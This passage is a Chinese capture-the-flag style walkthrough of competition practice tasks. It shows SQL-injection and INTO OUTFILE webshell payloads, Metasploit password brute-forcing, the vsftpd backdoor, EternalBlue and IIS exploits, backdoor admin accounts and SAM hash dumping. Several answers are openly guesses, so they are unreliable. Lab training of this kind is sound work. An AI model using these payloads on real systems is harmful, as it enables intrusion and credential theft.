RDP拒绝服务漏洞的攻击模块，将运行此模块后回显结果中倒数第1行的最后一个单词作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213718494-c0ae1396-eb36-4732-94ed-905270fb7f46.jpg)\n![](http://cdn.anyiblog.top/common/1649213719021-d2e4d372-d6b3-48ea-ac9a-8b4b0b1e299f.jpg)\nFLAG:completed\n\n5.进入靶机关闭远程桌面服务，再次运行MS12020\n\nRDP拒绝服务漏洞的攻击模块，运行此模块并将回显结果中倒数第2行的最后一个单词作为Flag值提交。\n\n![](http://cdn.anyiblog.top/common/1649213719430-75a70c17-858c-4d0a-9757-2270975b88bf.jpg)\nFLAG:Unreachable\n\n### B-3任务三：MYSQL安全测试\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.利用渗透机场景kali中的工具确定MySQL的端口，将MySQL端口作为Flag值提交；\n\nnmap -n -p- 10.140.98.239\n\n![](http://cdn.anyiblog.top/common/1649213719756-4637731c-8081-4e41-bdd4-bf7c4fd1f73e.jpg)\nFLAG:3306\n\n2.管理者曾在web界面登陆数据库，并执行了select '<?php echo \\\\'<pre>\\\\';system($\\_GET\\[\\\\'cmd\\\\'\\]); echo \\\\'</pre>\\\\'; ?>' INTO OUTFILE 'C:/phpstudy/test1.php'语句，结合本执行语句使用dos命令查看服务器的详细配置信息，并将服务器的系统型号作为Flag值提交；\n\nWEB端下访问test1.php?cmd=systeminfo\n\n![](http://cdn.anyiblog.top/common/1649213720111-9cd88d83-95ee-4b52-a318-285655689e07.jpg)\nFLAG:82L5\n\n3.利用渗透机场景kali中的msf工具使用root目录下password.txt字典文件破解MySQL的密码，并将破解MySQL的密码所需的模块当作Flag值 (账户为root) 提交;\n\nsearch mysql\\_login\n\n![](http://cdn.anyiblog.top/common/1649213720503-25a75fc4-cebd-4bd2-847a-302d1f459e60.jpg)\nauxiliary/scanner/mysql/mysql\\_login\n\n4.利用渗透机场景kali中的msf工具使用root目录下password.txt字典文件破解MySQL的密码，并将MySQL的密码当作Flag值 (账户为root) 提交;\n\nset rhosts 10.140.98.239 | set username root | set pass\\_file /root/password.txt|run\n\n![](http://cdn.anyiblog.top/common/1649213725290-ff2f53d0-6167-485a-bfb3-a46f86338178.jpg)\nFLAG:aaacab\n\n5.利用上题中的数据库账户密码在登陆数据库，通过select '<?php @eval($\\_POST\\[admin\\]);?>'\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\* 'C:/phpstudy/shell.php'语句向服务器提交名为shell.php的一句话木马，将语句中\\*号的明文作为Flag值（\\*为大写字母或者空格）提交；\n\nFLAG:INTO OUTFILE\n\n6.使用菜刀连接上题中的shell.php,下载服务器根目录下的压缩包，将压缩包中的Flag值提交。\n\n无环境\n\n  \n\n### B-4任务四：Web安全应用\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1. 通过渗透机扫描靶机Linux，将HTTP服务的端口号作为Flag值提交；\n\nFLAG:80\n\n2. 通过渗透机渗透靶机Linux的HTTP服务，将Web漏洞注入点的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n无环境\n\n3. 通过渗透机访问靶机Windows，获取后缀名为pcapng的数据包文件，该数据包为黑客对靶机Linux的渗透测试过程，并将文件名作为Flag值提交；\n\n无环境\n\n4. 通过渗透机分析pcapng数据包文件，将黑客登录管理员用户时使用的密码作为Flag值提交；\n\n无环境\n\n5. 通过渗透机分析pcapng数据包文件，将黑客上传的木马文件中的有效代码作为Flag值提交；\n\n无环境\n\n6. 通过渗透机分析pcapng数据包文件，将黑客连接数据库时使用的密码作为Flag值提交。\n\n无环境\n\n  \n\n### B-5任务五：网站XSS漏洞\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.进入靶机网站http://靶机IP/kzjb/，使用渗透机场景中的xsser命令检测靶机网站是否存在xss漏洞，将命令输出的Accur关键字的值作为FLAG值提交；\n\n命令：xsser -u http://靶机IP/kzjb/\n\n无环境\n\n2.使用test用户（密码：123456）登录靶机网站，在输入框中测试页面是否存在xss漏洞，使用JavaScript语句在页面中弹窗“HelloWorld”信息，将弹窗所需要的函数名称作为FLAG值提交；\n\nFLAG:alert\n\n3.分析输入框所在页面，将页面中出现的JavaScript函数名称作为FLAG值提交；\n\n无环境\n\n4.下载靶机FTP中文本文件，将下载的文本文件内容上传至网站输入框中。下载靶机FTP中的.py文件并运行，下载靶机FTP中的.pyc文件并运行。将.py文件输出第一行的第二个单词作为FLAG值提交；\n\n无环境\n\n5.下载靶机FTP中php文件，在http://靶机IP/kzjb/upload.php页面下上传php文件,获取C:\\\\flag.txt文件内容作为FLAG值提交。\n\n无环境\n\n  \n\n### B-6任务六：数据分析数字取证\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1.分析Server6桌面下的Alpha-1.pcapng数据包文件，通过分析数据包Alpha-1.pcapng找出恶意用户第一次访问服务器的数据包是第几号，并将该号数作为Flag值提交；\n\n无环境\n\n2.继续查看数据包文件Alpha-1.pcapng，分析出恶意用户扫描了哪些端口，并将全部的端口号从小到大作为Flag值（形式：端口1,端口2,端口3…,端口n）提交；\n\n21/22/23/80/3306\n\n无环境\n\n3.继续查看数据包文件Alpha-1.pcapng分析出恶意用户登陆后台所用的用户名是什么，并将用户名作为Flag值提交；\n\ntelnet/ftp/ssh/mysql + contains \"login\" 查找成功登录的用户\n\n无环境\n\n4.继续查看数据包文件Alpha-1.pcapng分析出恶意用户在第几个数据包到第几个数据包之间利用了MIME漏洞，并将该数据包之间的号数作为Flag值（格式：1,30）提交；\n\n查看Content-Type 不同的端口 对号数进行筛选\n\n无环境\n\n5.继续查看数据包文件Alpha-1.pcapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为Flag值提交；\n\n无环境\n\n6.继续查看数据包文件Alpha-1.pcapng分析出恶意用户第二次写入一句话木马是在哪个路径，并将改路径以及文件名和后缀作为Flag值提交；\n\n无环境\n\n7.继续查看数据包文件Alpha-1.pcapng分析出恶意用户下载了什么文件，并将该文件内容作为Flag值提交。\n\n无环境\n\n  \n\n### B-7任务七：Telnet弱口令渗透测试\n\n\\*任务说明：仅能获取Server7的IP地址\n\n1.在渗透机Kali2.0中使用Zenmap工具扫描服务器场景Windows所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口，并将该操作使用的命令中必须要添加的字符串作为Flag值（忽略ip地址）提交；\n\nnmap -p21,22,23 172.16.101.0/24\n\nFLAG:-p 21,22,23\n\n![](http://cdn.anyiblog.top/common/1649213725804-57c30643-86f3-4885-a60d-3ad81c4dbbb9.jpg)\nFLAG:23/tcp\n\n3.在渗透机Kali2.0中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为Flag值提交；\n\nsearch telnet\\_login\n\n![](http://cdn.anyiblog.top/common/1649213726230-8bc02e2d-47b9-4712-ad75-9989147a4e61.jpg)\nFLAG:auxiliary/scanner/telnet/telnet\\_login\n\n  \n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值（字段之间以英文逗号分隔，例hello,test，..,..）提交；\n\nFLAG:RHOSTS,PASS\\_FILE,THREADS,USERNAME\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\nFLAG:set RHOSTS\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt，用户名为user爆破获取密码并将得到的密码作为Flag值提交；\n\nFLAG:aaaab1\n\n7.在上一题的基础上，使用第6题获取到的密码telnet到靶机，将桌面上Flag值.bmp的图片文件中的英文单词作为Flag值提交。\n\n无环境\n\n  \n\n### B-8任务八：Linux系统安全\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server8进行系统服务及版本扫描渗透测试，并将该操作显示结果中22端口对应的服务版本信息字符串作为Flag值提交；\n\nFLAG:OpenSSH 4.3 (protocol 2.0)\n\n2.找到/var/www目录中的图片文件，将文件名称作为Flag值提交；\n\nvsftpd笑脸漏洞：ftp ip -> usernm:root:) passwd:root:) -> nc ip 6200 -> shell\n\n无环境\n\n3.找到Flag1作为Flag值提交；\n\n无环境\n\n4.找到Flag2作为Flag值提交；\n\n无环境\n\n5.找到Flag3作为Flag值提交。\n\n无环境\n\n  \n\n### B-9任务九：Windows操作系统渗透测试\n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server9进行系统服务及版本扫描渗透测试，并将该操作显示结果中1433端口对应的服务版本信息作为Flag值（例如3.1.4500）提交；\n\nFLAG:9.00.1399.00\n\n2.通过本地PC中渗透测试平台Kali对服务器场景Server9进行系统服务及版本扫描渗透测试，将DNS服务器的主机完全合格域名作为Flag值提交；\n\n无环境\n\n3.将目标服务器中SQL-Server数据库低权限（无法通过数据库执行指令系统命令）用户的密码作为Flag值提交；\n\nmsfconsole -> search mssql > 设置目标地址、用户、密码字典 爆破得到密码\n\n无环境\n\n4.将目标服务器中SQL-Server数据库权限较高（可以通过数据库指令执行系统命令）用户的密码作为Flag值提交；\n\nmsfconsole -> search mssql > 设置目标地址、用户、密码字典 爆破得到密码\n\n无环境\n\n5.找到C:\\\\Windows\\\\system32文件夹中266437文件夹中后缀为.docx的文件，将文档内容作为Flag值提交；\n\n使用mssql\\_exec模块 设置账号密码 添加后门用户cmd设置\n\ncmd.exe /c net user hacker 123456/add\n\ncmd.exe /c net localgroup administrators hacker /add\n\n之后rdesktop ip 远程查看文件内容。\n\n无环境\n\n  \n\n### B-10任务十：应急响应\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.黑客通过网络攻入本地服务器，在Web服务器的主页上外挂了一个木马连接，请你找到此连接并删除该连接，将对应的标题名称作为Flag值提交;\n\n一般是IIS服务器 在默认路径下找下文件即可。\n\n木马后缀一般为\\*.asp \\*.php\n\n无环境\n\n2.黑客攻入本地的数据库服务器，并添加了除admin以外的具有一个管理员权限的超级用户，将此用户的密码作为Flag值提交;\n\n1.Windows导出SAM和SYSTEM文件 在C:/WINDOWS/SYSTEM32/config文件下 一般好像拷贝不下来。\n\n这边在cmd输入\n\nreg save hklm\\\\sam sam.hive\n\nreg save hklm\\\\system system.hive\n\n获得sam和system文件\n\n![](http://cdn.anyiblog.top/common/1649213726603-8a710900-67c6-4b4d-b31f-5bc5ac3ac6ba.jpg)\n2.将文件复制至kali中 利用samdump2 system.hive sam.hive > passwd.txt\n\n通过两个文件获取windows系统密码哈希值\n\n![](http://cdn.anyiblog.top/common/1649213727236-74489611-e1ce-41f0-9ef7-a483a61bc379.jpg)\n3.使用john进行爆破 用法：john --format=NT passwd.txt\n\njohn跑出后得到密码。\n\n  \n\n3.黑客攻入本地服务器，在本地服务器建立了多个超级用户，请你删除除了Administrator用户以外的其他超级管理员用户，然后在命令行窗口输入net user，将Administrator右边第一个单词作为Flag值提交;\n\nnet user即可\n\nFLAG:DefaultAccount\n\n4.黑客修改了服务器的启动内容，请你删除不必要的启动项程序，将该启动项程序的名称作为Flag值（如有多个名称之间以英文逗号分隔，如：hello,test）提交;\n\nmsconfig -> 启动\n\n无环境\n\n5.黑客在服务器某处存放了一个木马程序，请你找到此木马程序并清除木马，将木马文件名作为Flag值提交。\n\nrecent \\-> 查看最近打开或移动的文件\n\ntasklist\n\n  \n\n# 国赛例卷4：\n\n### B-1任务一：信息收集与利用\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.在渗透机Kali2.0中使用autoscan工具扫描服务器场景Server1所在网段(例如：172.16.101.0/24)范围内存活的主机地址。判断存活主机是否开放网络管理服务，若开启则以扫描出开启SNMP服务的主机名作为Flag值提交；\n\n点击桌面左下角菜单按钮依次打开BackTrack——Informatica Gathering——Network Analysis——Network Scanners——autoscan\n\n![](http://cdn.anyiblog.top/common/1649213732010-5b9eba80-952a-48ae-958f-a8cb86c581ee.jpg)\n根据导航栏的提示，首先点击Options按钮，下拉找到局域网段，如果不存在点击Add来添加要扫描的网段，后选择24位掩码即255.255.255.0，然后在后面的表格中填入172.16.1.0(根据实际网络情况来进行填写)，然后点击Forward继续下一步\n\n![](http://cdn.anyiblog.top/common/1649213741801-a6937b6e-b7b9-49f4-ad72-fd9453345603.jpg)\n在后面两个页面中直接点击Forward跳过，软件默认选择eth0外网口来发送探测数据包\n\n![](http://cdn.anyiblog.top/common/1649213745343-7c571809-1411-4781-8b5a-aae3891b41fa.jpg)\n![](http://cdn.anyiblog.top/common/1649213745774-dea6e590-cc8e-436b-be5b-45e9d3eeda13.jpg)\n2.在渗透机Kali2.0中使用nmap工具进行UDP扫描服务器场景Server1所在网段范围内存活的主机地址，判断网络管理服务的开放情况，若开启，则以扫描出SNMP开放的端口号作为Flag值（各端口之间用英文分号分割，例21;23），若未开放则提交none作为Flag值；\n\nnmap -n -sU 172.16.101.0/24\n\n![](http://cdn.anyiblog.top/common/1649213746226-2626b737-c53e-43c9-9b8c-ac22e3f85979.jpg)\nFLAG:161;162\n\n3.在渗透机Kali2.0中调用snmpwalk工具测试服务器场景Server1是否开启Windows SNMP服务（共同体为默认字符串为public，通过对目标靶机的.1.3.6.1.2.1.25.1.6分支进行snmpwalk来测试服务的开放情况（SNMP 版本为v2c），并将该操作使用的命令中必须要使用的参数作为Flag值（各参数之间用英文分号分割，例a;b）提交；\n\n![](http://cdn.anyiblog.top/common/1649213746575-36f3dfd7-8908-4fbc-85a9-2e4b8a8928e7.jpg)\nsnmpwalk -v 2c -c public IP .1.3.6.1.2.1.25.1.6\n\nFLAG:v;c\n\n4.在渗透机Kali2.0中使用ADMsnmp工具尝试猜解团体字符串，并将使用的全部命令作为Flag值（提交答案时IP以192.168.100.10代替，使用默认字典snmp.passwd）提交；\n\n![](http://cdn.anyiblog.top/common/1649213752263-058a49b5-ba54-49dd-aeef-c6a8fc385fea.jpg)\nFLAG:./ADMsnmp 192.168.100.10 --wordfile snmp.passwd\n\n5.更换使用onesixtyone工具执行命令查看帮助选项，并将输入的命令作为Flag值提交；\n\n切换/pentest/enumeration/snmp/onesixtyone路径下\n\n然后使用命令./onesixtyone 来查看帮助信息\n\n![](http://cdn.anyiblog.top/common/1649213756325-7bb119d2-3e9d-4eab-8917-c567bda35332.jpg)\nFLAG:./onesixtyone\n\n6.在渗透机Kali2.0中使用onesixtyone对靶机SNMP进行团体字符串猜解，并将使用的全部命令作为Flag值（提交的命令为忽略IP后必须使用的命令，字典名字为dict.txt）提交；\n\n![](http://cdn.anyiblog.top/common/1649213765094-c0426019-73d6-473a-ba6f-114aa447efa4.jpg)\nFLAG:./onesixtyone -c dict.txt\n\n7.在渗透机Kali2.0中对猜解结果进行查看，将回显中猜解的团体字符串作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213766688-34b793e3-ff32-4995-8688-b400b756c795.jpg)\nFLAG:public\n\n8.在渗透机Kali2.0中选择新的SNMP攻击模块snmpcheck，根据得到的public团体字符串并利用snmpcheck进行对靶机的信息收集，并将该操作使用的命令中必须使用的参数作为Flag值提交；\n\n切换路径至/pentest/enumeration/snmp/snmpcheck\n\n![](http://cdn.anyiblog.top/common/1649213769962-4de0206f-4ce6-42fb-875d-c78cfb7d4db0.jpg)\nsnmpcheck -t 192.168.100.1\n\n![](http://cdn.anyiblog.top/common/1649213774885-8576344c-04bb-4021-af07-5c337e37b838.jpg)\nFLAG:t\n\n9.查看获取的系统信息，将系统管理员用户和异常（黑客）用户作为Flag值（各用户之间用英文分号分割，例root;user）提交。\n\nsnmpcheck -t 192.168.100.1\n\n![](http://cdn.anyiblog.top/common/1649213778024-80b0b11f-c8d1-4154-adba-ab86e533c3b2.jpg)\nFLAG:Administrator;hacker\n\n  \n\n### B-2任务二：数据库渗透测试\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.在渗透机Kali2.0中使用zenmap工具扫描服务器场景Server2所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的1433、3306、80端口。并将该操作使用的命令中必须要使用的字符串作为Flag值提交；\n\nnmap -n -p1433,3306,80 172.16.101.0/24\n\n![](http://cdn.anyiblog.top/common/1649213779079-efd91873-c7da-483a-84b7-1cc4ea6e6bb7.jpg)\nFLAG:-p 1433,3306,80\n\n2.通过渗透机Kali2.0对服务器场景Server2进行系统服务及版本扫描渗透测试，并将该操作显示结果中数据库服务对应的服务端口信息作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213779539-0aeae0c7-7b4b-462e-aa79-03fef8608bcd.jpg)\nFLAG:1433/tcp\n\n3.在渗透机Kali2.0中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称作为Flag值提交；\n\nsearch mssql\\_login\n\n![](http://cdn.anyiblog.top/common/1649213779993-357c6b3e-996b-4363-9f17-4e440fe4a2bf.jpg)\nFLAG:auxiliary/scanner/mssql/mssql\\_login\n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值（之间以英文逗号分隔，例hello,test，..,..）提交；\n\nFLAG:RHOSTS,PASS\\_FILE,THREADS,USERNAME\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\nFLAG:set RHOSTS\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt爆破获取密码并将得到的密码作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213785101-2542d1cf-e93f-4423-8626-dc8e1e512938.jpg)\nFLAG:3ab1c2\n\n7.在msf模块中切换新的渗透模块，对服务器场景server2003进行数据库服务扩展存储过程进行利用，将调用该模块的命令作为Flag值提交；\n\nsearch mssql\\_exec\n\n![](http://cdn.anyiblog.top/common/1649213786132-46d504f1-6b9c-4629-af52-6eb42d287a0a.jpg)\nFLAG:auxiliary/admin/mssql/mssql\\_exec\n\n8.在上一题的基础上，使用第6题获取到的密码并进行提权，同时使用show options命令查看需要的配置，并配置CMD参数来查看系统用户，将配置的命令作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213790231-d9d537fb-4af6-44b5-bddd-147c54f17c11.jpg)\nFLAG:set CMD cmd.exe/c net user\n\n9.在利用msf模块获取系统权限并查看目标系统的异常（黑客）用户，并将该用户作为Flag值提交。\n\n![](http://cdn.anyiblog.top/common/1649213795633-e5260bb9-9dc1-4383-a890-23ef95c5fefb.jpg)\nFLAG:hacker\n\n  \n\n### B-3任务三：远程文件包含\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.扫描靶机服务器，将靶机FTP服务版本作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213803129-5ee0bd59-b13e-42c5-beaf-f134f6b1af36.jpg)\nFLAG:vsftpd 2.3.4\n\n无环境\n\n2.进入靶机网站http://靶机IP/rfi/将靶机文件传输服务下的图片木马文件上传，将文件上传后的URL地址作为Flag值（形式：[http://192.168.1.1/](http://192.168.1.1/)文件路径）提交；\n\n猜测FLAG: [https://192.168.1.1/uploads](https://192.168.1.1/uploads)\n\n无环境\n\n3.查看/etc/passwd文件内容，将uid为10003的用户名作为Flag值提交；\n\n上传一句话木马后 ?s=system('cat /etc/passwd|grep 10003');\n\n无环境\n\n4.执行靶机文件传输服务中的php文件，将输出的弹窗信息作为Flag值提交；\n\n猜测FLAG：上传成功\n\n5.下载靶机文件传输服务中php文件，填充内容。执行完善的php文件，将完整的URL作为Flag值（形式：[http://192.168.1.1/](http://192.168.1.1/)页面路径）提交；\n\n无环境\n\n6.查看靶机内核版本，将靶机内核版本作为Flag值提交。\n\nuname -a\n\n![](http://cdn.anyiblog.top/common/1649213803532-d8953c90-661f-430b-966d-367173d9e25c.jpg)\nFLAG:5.10.0-kali3-amd64\n\n  \n\n### B-4任务四：Windows系统安全\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server4进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务状态信息字符串作为Flag值提交；\n\nFLAG:open\n\n2.将首选DNS服务器地址作为Flag值提交；\n\n如果是windows7的靶机使用ms17\\_010永恒之蓝进行攻击\n\n如果是windows2003 且扫描中80端口的版本为IIS6.0 可使用CVE2017-7269进行攻击\n\n进入meterpreter后输入shell -> nslookup 或 ipconfig /all\n\n![](http://cdn.anyiblog.top/common/1649213803893-269291ab-b409-4ed3-89b2-dce816fd5e0e.jpg)\nFLAG:192.168.31.1\n\n无环境\n\n3.找到Flag1作为Flag值提交；\n\n这边一般是查看某某目录下的某文件\n\n无环境\n\n4.找到Flag2作为Flag值提交；\n\n无环境\n\n5.将系统最高权限管理员账户的密码作为Flag值提交。\n\n需要注意的是通过CVE2017-7269打入后权限特别低 执行不了hashdump\n\n因此打通后先在meterpreter上传pr.exe 和 3389.bat （要切换到有权限的目录 如c:/111）\n\n之后用 pr.exe \"net user hacker 123456 /add\" & pr.exe \"net localgroup administrators hacker /add\"\n\n添加后门用户hacker至admin组 执行完毕后输入pr.exe \"call 3389.bat\" 开启远程端口\n\nrdesktop IP；hacker 123456远程连接\n\n之后用ms14\\_064 设置好参数后运行进行监听 得到了攻击机的恶意url\n\n在靶机中访问该url 发现ms14\\_064弹了个会话 sessions -i查看 之后sessions -1进入shell\n\nshell中即可hashdump获得用户hash值 之后用ophcrack -> load single hash -> crack即可爆出管理员密码\n\nFLAG:xcvfdsrewq4682\n\n  \n\n### B-5任务五：MYSQL信息收集\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.通过渗透机场景Kali中的渗透测试工具对服务器场景MySQL03进行服务信息扫描渗透测试（使用Nmap工具），并将该操作显示结果中数据库版本信息作为Flag值提交；\n\nnmap -n -sV -p3306 10.140.98.239\n\n![](http://cdn.anyiblog.top/common/1649213804290-d6aed556-73f5-48ff-abc6-02c011043671.jpg)\nFLAG:MySQL 5.6.50-log\n\n2.通过渗透机场景Kali中的渗透测试工具对服务器场景MySQL03的数据库进行暴力破解，并将数据库的密码作为Flag值（字典/root/mysql03.txt）提交；\n\nmsfconsole -> search mysql\\_login > use auxiliary/scanner/mysql/mysql\\_login\n\n![](http://cdn.anyiblog.top/common/1649213804887-32f4ccb6-e87d-46f5-ab89-a99e881c953b.jpg)\n查看需设置的选项 其中PASS\\_FILE RHOSTS THREADS设置即可 分别设置为爆破字典、目标靶机、线程数\n\n![](http://cdn.anyiblog.top/common/1649213806154-5a3b06e4-547a-49a9-aa38-58840dc9bcc4.jpg)\n![](http://cdn.anyiblog.top/common/1649213806555-8a44d484-9818-4fea-8783-6a3315538e00.jpg)\nrun运行得到mysql密码\n\n![](http://cdn.anyiblog.top/common/1649213810976-61b1e77e-07d2-4ce9-80a5-c61e2e366ec4.jpg)\nFLAG:aaacab\n\n  \n\n3.通过渗透机场景Kali对服务器场景MySQL03的数据库进行远程连接，并将数据库中库的数量作为Flag值提交；\n\nmysql -hIP -uroot -pPassword 远程登陆\n\nmysql下输入show databases;显示数据库 再数一下即可。\n\nFLAG:4\n\n4.通过渗透机场景Kali对服务器场景MySQL03的数据库进行状态查询，并将数据库状态中的版本作为Flag值提交；\n\nselect version();\n\n![](http://cdn.anyiblog.top/common/1649213811379-575399d7-ac35-4b31-b419-e7ec6f4d6118.jpg)\nFLAG:10.5.8-MariaDB-3\n\n5.通过渗透机场景Kali对服务器场景MySQL03中数据库进行查询当前使用的数据库，并将数据库名称作为Flag值提交；\n\nselect databases();\n\n![](http://cdn.anyiblog.top/common/1649213811740-4e311c25-b78a-4d29-a322-dddf8b9810fe.jpg)\nFLAG:mysql\n\n6.通过渗透机场景Kali对服务器场景MySQL03中数据库进行数据库的所有用户信息查询，并将倒数第二个用户名作为Flag值提交；\n\nselect id,username from wordpress.wp\\_users;\n\n猜测FLAG:anonymous\n\n7.通过渗透机场景Kali对服务器场景MySQL03中数据库进行数据文件存放路径查询，并将存放路径作为Flag值提交；\n\nshow variables like '%datadir%';\n\n![](http://cdn.anyiblog.top/common/1649213812090-2e9aa80d-977b-432a-a129-388225a88143.jpg)\nFLAG:/var/lib/mysql\n\n  \n\n### B-6任务六：Web渗透测试\n\n\\*任务说明：仅能获取Server6的IP地址\n\n（猜测是一个存在sql注入的网页）\n\n1.获取PHP的版本号作为Flag值（例如：5.2.14）提交；\n\nnikto -h IP\n\n![](http://cdn.anyiblog.top/common/1649213813367-f549aca0-5489-4b63-8523-c171231cd54d.jpg)\nFLAG:PHP/5.3.3\n\n猜测payload: 1' union select 1,2,\"<?php eval($\\_GET\\[s\\]);?>\" INTO OUTFILE '/var/www/html/shell.php'\n\n通过sql注入写马 再之后访问shell.php?s=phpinfo();\n\n得到php版本\n\n无环境\n\n2.获取MySQL数据库的版本号作为Flag值（例如：5.0.22）提交；\n\nnmap -sV -n IP\n\n![](http://cdn.anyiblog.top/common/1649213814069-5bc63c9b-7f57-45f5-93cd-cc8bf50473ce.jpg)\nFLAG:MySQL 5.6.50-log\n\n猜测payload: 1' union select 1,database(),3 #\n\n无环境\n\n3.获取系统的内核版本号作为Flag值（例如：2.6.18）提交；\n\nnmap -O -n IP\n\n![](http://cdn.anyiblog.top/common/1649213815777-2757095d-8e9c-4f4c-927a-be525d2372bb.jpg)\nFLAG:Linux 2.6.32\n\n4.获取网站后台管理员admin用户的密码作为Flag值提交；\n\n进入msf(适用于Apache2.2.15)\n\nsearch apache\\_mod\n\napache\\_mod\\_cgi\\_bash\\_env\\_exec\n\nset targeturi /cgi-bin/bin\n\nset rhost IP\n\n在/var/www/html/loginmanager.html中存在密码\n\n![](http://cdn.anyiblog.top/common/1649213816979-e83480d9-9dc9-4f54-92b6-b492b9ac99fc.jpg)\nFLAG:slkrung\n\n5.找到/root目录中的txt文件，将文件内容作为Flag值提交。\n\n在shell里直接cat /root/\\*.txt 或ls /root |cat xxx.txt\n\n无环境\n\n  \n\n### B-7任务七：Web安全应用\n\n\\*任务说明：仅能获取Server7的IP地址\n\n1.通过渗透机扫描靶机的端口（使用Nmap工具），将HTTP服务的服务名称作为Flag值提交；\n\nnmap -n -sV -p80 10.140.98.232\n\n![](http://cdn.anyiblog.top/common/1649213818063-9cda983f-3c78-4659-8b95-029402af6b4a.jpg)\nFLAG:Apache httpd\n\n2.使用渗透机的火狐浏览器访问靶机HTTP服务根目录，根据页面提示寻找注入点，将注入点的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n猜测FLAG:http://172.16.1.1/page.php\n\n  \n\n3.通过靶机Web应用服务的注入点，对其进行渗透测试，将当前Web应用服务使用的数据库名作为Flag值提交；\n\n1' union select database(),version(),3 # //获取数据库名\n\n  \n\n或\n\n  \n\nsqlmap -u [http://172.13.2.249/page.php?id=1](http://172.13.2.249/page.php?id=1) \\--dbs //获得数据库\n\n  \n\n猜测FLAG:wordpress\n\n  \n\n无环境\n\n  \n\n4.对靶机注入点进行渗透测试，将当前Web应用服务使用的数据库中第2个表（使用字母a-z顺序进行排序）的表名作为Flag值提交；\n\n1' union select table\\_name,2,3 from information\\_schema.tables where table\\_schema=database() limit 1,1# //获取当前数据库下的所有表\n\n或\n\nsqlmap -u [http://172.13.2.249/page.php?id=1](http://172.13.2.249/page.php?id=1) \\-D test --tables //获得表名\n\n  \n\n猜测FLAG:users\n\n  \n\n无环境\n\n  \n\n5.通过渗透机访问靶机HTTP服务，获取该站点后台管理员用户的密码，并将密码作为Flag值提交。\n\n1' union select column\\_name,2,3 from information\\_schema.columns where table\\_schema=database() and table\\_name='users' limit 1,1# //获取当前数据库下users表的字段 比如为id username password\n\n1' union select id,username,password from users where username='admin'; //获取密码\n\n或\n\nsqlmap -u [http://172.13.2.249/page.php?id=1](http://172.13.2.249/page.php?id=1) \\-D test -T users --columns //获得字段\n\nsqlmap -u [http://172.13.2.249/page.php?id=1](http://172.13.2.249/page.php?id=1) \\-D test -T users --dump //获得内容\n\n  \n\n猜测FLAG:admin123\n\n  \n\n无环境\n\n  \n\n### B-8任务八：数据分析数字取证\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.分析Server8桌面下的Bravo-1.pcapng数据包文件，通过分析数据包Bravo-1.pcapng找出恶意用户目录扫描的第2个目录名，并将该目录名作为Flag值提交;\n\n过滤规则：http\n\n![](http://cdn.anyiblog.top/common/1649213818830-07bae3b2-bc37-430b-a9e2-3c66b211c85b.jpg)\nFLAG:uploads\n\n2.继续查看数据包文件Bravo-1.pcapng，分析出恶意用户通过哪个目录写入的一句话木马，并将该目录名作为Flag值提交;\n\n![](http://cdn.anyiblog.top/common/1649213820458-c4156a64-a5ad-4cde-867e-5445645441f7.jpg)\n注:是从这个目录写入的而不是木马在这个文件里\n\nFLAG:phpmyadmin\n\n3.继续查看数据包文件Bravo-1.pcapng分析出恶意用户读取了服务器什么文件，并将该文件名及后缀作为Flag值提交;\n\n![](http://cdn.anyiblog.top/common/1649213821405-1f5b0d6f-67ac-46b1-b4d2-83065a824c03.jpg)\n在phpmyadmin/sql.php该流下找到了输入的参数\n\nFLAG:flag.txt\n\n4.继续查看数据包文件Bravo-1.pcapng分析出恶意用户写入一句话木马的路径是什么，并将该路径作为Flag值提交;\n\n在底部发现shell2.php\n\n![](http://cdn.anyiblog.top/common/1649213822333-3e856777-26fa-4f28-b07f-34a0a7ef3339.jpg)\n追踪TCP流：\n\n![](http://cdn.anyiblog.top/common/1649213823002-a185d883-a03a-4b35-86e9-b63c52310b9e.jpg)\nFLAG:C:/phpstudy/www/m/shell2.php\n\n5.继续查看数据包文件Bravo-1.pcapng分析出恶意用户连接一句话木马的密码是什么，并将一句话木马作为Flag值提交;\n\n![](http://cdn.anyiblog.top/common/1649213824116-55323c50-083f-4f22-8e91-efb4259b3457.jpg)\nFLAG:cia\n\n6.继续查看数据包文件Bravo-1.pcapng分析出